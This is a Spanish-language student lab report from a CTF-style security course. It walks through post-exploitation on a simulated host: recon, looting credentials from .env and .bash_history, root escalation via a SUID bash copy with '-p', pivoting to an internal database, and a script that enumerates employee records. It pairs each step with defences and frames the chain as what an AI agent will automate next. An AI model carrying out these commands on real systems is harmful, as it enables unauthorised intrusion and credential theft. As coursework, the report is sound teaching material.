# Laboratorio 08 — Post-explotación y automatización

**Unidad 8** · Post-explotación sobre PhantomCorp
**Grupo:** 02
**Integrantes:**

| Nombre y apellido | Legajo | Usuario de GitHub |
|---|---|---|
| Milanesio Hebe Del Lourdes | 15343 | @hebemilanesio1 |
| Romero Jimena Soledad | 15377 | @Jimena-Romero |
| Toranzo Juan Cruz | 15308 | @JuanToranzo |
| Torres Damaris | 14563 | @damaris412 |

**Entorno:** Docker — host comprometido `phantomcorp` (usuario `operador`) + host interno `phantomcorp-db`

> Continúa el Lab 07. Partimos de una shell sin privilegios como `operador` en el
> servidor de PhantomCorp (simula el RCE ya logrado) y recorremos todo el ciclo de
> post-explotación: recon interno → loot → escalada → pivoting → automatización.

---

## 1. Informe de post-explotación

| Fase | Qué hicimos | Comando / técnica | Evidencia | Defensa |
|---|---|---|---|---|
| **Recon host** | Identificamos usuario, sistema y redes del host donde caímos. Detectamos que el host es **dual-homed** (dos interfaces). | `id`, `whoami`, `uname -a`, `ip addr`, `cat /etc/hosts`, `ls -la /opt /var/www /home` | `operador` (uid 1000); `eth0 172.19.0.3` + `eth1 172.18.0.3` → el host ve dos redes. Nota de deploy en `/opt/phantom-deploy/DEPLOY_NOTES.txt` → `FLAG{post_situational_awareness}` | No dejar notas/tokens en el filesystem; principio de mínimo privilegio para el usuario del servicio web |
| **Loot** | Leímos el archivo de configuración de la app y el historial de comandos. | `cat /var/www/.env`, `cat ~/.bash_history` | `/var/www/.env`: `DB_USER=phantom_app`, `DB_PASS=Ph@ntom-DB-2024`, `APP_SECRET=FLAG{loot_credentials_found}`. El `.bash_history` reveló `curl http://phantomcorp-db/` (pista del pivot) | Secretos fuera del disco (gestor de secretos / variables inyectadas en runtime); no versionar `.env`; limpiar history |
| **Privesc** | Encontramos un binario SUID no estándar (copia de `bash`) y lo usamos para ejecutar como root. | `find / -perm -4000 -type f`; `/usr/local/bin/system-check -p` | SUID raro: `/usr/local/bin/system-check` (`-rwsr-xr-x root`, 1.412.096 B = tamaño de bash). Con `-p`: `euid=0(root)` → `cat /root/flag.txt` → `FLAG{privesc_suid_root}` | Quitar el bit SUID; minimizar binarios SUID; usar capabilities acotadas en vez de SUID-root |
| **Pivoting** | Desde el host víctima alcanzamos la DB interna que la consola del atacante no ve. | `curl -s http://phantomcorp-db/` | `{"host":"phantomcorp-db", ..., "pivot":"FLAG{pivot_internal_host}"}`. Alcanzable solo por `eth1` (172.18.0.0/16, red interna segmentada) | Segmentar de verdad: el servidor web no debería poder iniciar conexiones a la DB salvo al puerto/protocolo estrictamente necesario (egress filtering) |
| **Automatización** | Convertimos el barrido manual de 250 legajos en una herramienta (`recolector.py`). | `recolector.py --base http://phantomcorp-db --desde 1 --hasta 250` (y prueba previa con `for` en bash) | El legajo `id=187` (`cuenta-servicio`) trae la clave extra `legajo_oculto` → `FLAG{automation_pays_off}` | Rate limiting y detección de enumeración secuencial; autenticación en el endpoint interno |

**Flags obtenidas: 5/5** → R1 `FLAG{post_situational_awareness}` · R2 `FLAG{loot_credentials_found}` · R3 `FLAG{privesc_suid_root}` · R4 `FLAG{pivot_internal_host}` · R5 `FLAG{automation_pays_off}`.

---

## 2. El script de automatización

El entregable central es `src/recolector.py`, que completa la función `buscar_flag()`
del esqueleto. La lógica:

- Recorre el rango `[desde, hasta]` consultando `/empleado?id=N` con `urllib` (solo
  biblioteca estándar).
- Detecta el legajo con el flag por **dos señales** (robustez): una clave fuera del
  conjunto normal (`id`, `nombre`, `area`) — en este caso `legajo_oculto` — o
  cualquier valor que contenga `FLAG{`.
- **Corta apenas lo encuentra** (no sigue enumerando de gusto).

Ejecución y salida real:

```
$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
[*] Enumerando legajos 1..250 en http://phantomcorp-db
[+] Flag en el legajo id=187: FLAG{automation_pays_off}
```

> **Bonus (pipeline hacia el Lab 09).** El flujo completo del curso se encadena así:
> `recon (nmap) → enumeración (dirb/whatweb) → explotación (RCE) → post-exploit
> (loot + privesc + pivot) → exfiltración (recolector.py)`. Cada etapa produce la
> entrada de la siguiente (un puerto abierto → una ruta → una shell → credenciales →
> un host interno → datos). Automatizar ese encadenamiento, decidiendo en cada paso
> qué rama seguir según el resultado anterior, es exactamente lo que orquestará un
> agente en el Lab 09: nosotros definimos la lógica, la máquina repite y encadena.

---

## 3. Preguntas de análisis

### P1 · ¿Por qué un binario SUID es peligroso? ¿Qué hace el flag `-p`?

El bit **SUID** hace que un ejecutable corra con los permisos de su **dueño**, no
de quien lo ejecuta. Si el dueño es `root`, cualquier usuario que lo corra obtiene
privilegios de root **durante esa ejecución**. Es peligroso cuando el binario
permite ejecutar comandos o leer archivos arbitrarios (una copia de `bash`, `find`,
`vim`, `python`, etc.): el usuario común termina actuando como root.

El flag `-p` de bash evita que el shell **baje los privilegios** al arrancar. Por
defecto, bash detecta que `euid != uid` y descarta el euid elevado por seguridad.
Con `-p` mantiene el `euid=0` heredado del SUID, dándote un shell con permisos de
root. Por eso `system-check -p` nos dejó leer `/root/flag.txt`.

### P2 · Pivoting: ¿por qué el atacante no alcanzaba `phantomcorp-db` y nosotros sí?

Las redes están **segmentadas**. La consola del atacante vive en la red externa
(`labnet`) y no tiene ruta a la red interna (`internalnet`, `172.18.0.0/16`) donde
está la DB. El host víctima, en cambio, es **dual-homed**: tiene `eth0` en la red
externa (`172.19.0.3`) **y** `eth1` en la interna (`172.18.0.3`). Al comprometerlo,
lo usamos de **trampolín**: desde adentro, `curl http://phantomcorp-db/` sale por
`eth1` y llega a un host que desde Internet era invisible. Ese es el movimiento
lateral: no atacás la DB desde afuera, la alcanzás a través del equipo que sí la ve.

### P3 · El `.bash_history` y el `.env` nos dieron loot. ¿Qué práctica lo evita?

Los secretos no deben vivir en el filesystem de la aplicación. Prácticas que lo
evitan:

- **Gestor de secretos** (Vault, AWS Secrets Manager, Docker secrets) o variables
  de entorno **inyectadas en runtime**, nunca un `.env` en el disco del servidor.
- **No versionar** el `.env` (ponerlo en `.gitignore`) y rotar cualquier credencial
  que haya quedado expuesta.
- Para el history: deshabilitarlo en cuentas de servicio (`unset HISTFILE` /
  `HISTSIZE=0`) o usar shells no interactivos, para que los comandos (y las URLs
  internas que revelan) no queden registrados.

### P4 · Tu script automatizó 250 requests. ¿Qué decisiones tomaste vos que el script no toma solo?

El script ejecuta la repetición, pero la **lógica la definimos nosotros**:

- **Qué endpoint** consultar y con qué parámetro (`/empleado?id=N`).
- **El rango** a barrer (1..250) y cuándo cortar (apenas aparece el flag).
- **Cómo reconocer** el hallazgo: decidir que el registro bueno se distingue por una
  clave que los normales no tienen (`legajo_oculto`) o por el patrón `FLAG{`.
- **Cómo manejar errores** (404 = inexistente, timeouts) sin abortar todo.

Esas son decisiones de criterio, no de ejecución. Es la diferencia clave con el
Lab 09: un agente toma **esas** decisiones por su cuenta a partir de un objetivo;
acá todavía las fijamos nosotros y la máquina solo repite.

### P5 · Defensor: una mitigación para el privesc por SUID y otra para el pivoting.

- **SUID:** quitar el bit (`chmod u-s /usr/local/bin/system-check`) y, como política,
  minimizar los binarios SUID del sistema. Si un proceso necesita un permiso puntual,
  usar **capabilities** acotadas (p. ej. `cap_net_bind_service`) en lugar de
  SUID-root, que es todo-o-nada. Auditar periódicamente con `find / -perm -4000`.
- **Pivoting:** segmentación real con **egress filtering**. El servidor web no
  debería poder iniciar conexiones arbitrarias a la red interna: una regla de
  firewall que permita solo el puerto/protocolo estrictamente necesario hacia la DB
  (y nada más) corta el trampolín. Microsegmentación + mínimo privilegio de red.

---

## 4. Captura de `./ctf status 08`

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                        │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO!
```

---

## 5. Conclusión

Un shell sin privilegios fue solo el punto de partida. Encadenando recon interno,
loot, una escalada por SUID, un pivot a la red segmentada y la automatización del
barrido de legajos, pasamos de "tengo una sesión como `operador`" a "tengo root en
el host y datos de un sistema interno que desde afuera no existía". El `recolector.py`
cierra la idea central del lab: lo que se hace más de una vez se convierte en
herramienta, y esa herramienta es el escalón previo a delegar la orquestación en un
agente (Lab 09).
